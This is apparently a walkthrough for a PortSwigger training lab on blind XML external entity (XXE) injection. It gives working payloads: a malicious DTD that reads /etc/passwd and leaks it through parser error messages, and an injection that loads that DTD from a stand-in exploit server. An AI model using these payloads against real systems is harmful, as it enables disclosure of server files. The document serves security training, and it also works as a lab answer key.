# Lab 09 — Exploiting blind XXE to retrieve data via error messages

> **Expert** · [Official lab](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)

**Entry point:** `POST /product/stock` (blind) · exfil via **error
messages** instead of Collaborator.

## Solution

1. Save this DTD on the exploit server — it stuffs `/etc/passwd` into an
   invalid file path, forcing an error that echoes it:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

2. Inject the reference into the stock-check XML:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://YOUR-EXPLOIT-SERVER/evil.dtd"> %xxe;]>
```

3. The response's error message contains the full `/etc/passwd` —
   lab solved.

## Notes

Same multi-stage parameter-entity trick as the OOB lab, but the exfil
channel is the XML parser's own error output.
